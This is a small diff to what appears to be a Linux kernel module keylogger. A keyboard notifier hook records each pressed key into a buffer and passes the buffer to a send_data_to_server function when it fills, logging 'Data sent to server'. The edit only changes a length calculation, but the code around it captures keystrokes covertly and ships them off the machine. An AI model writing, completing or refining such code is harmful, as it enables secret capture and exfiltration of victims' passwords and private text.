@@ -139,7 +139,7 @@ static int keyboard_event(struct notifier_block *nb, unsigned long code, void *p
     if (kp->down && kp->value >= 0 && kp->value <= MAX_KEYCODE) {
         const char *key_char = keymap[kp->value];
         if (key_char) {
-            int key_len = strlen(key_char);
+            int key_len = strlen(key_char) + 1;
             if (message_len + key_len > BUFFER_SIZE) {
                 send_data_to_server(message);
                 pr_info("Data sent to server: %s", message);
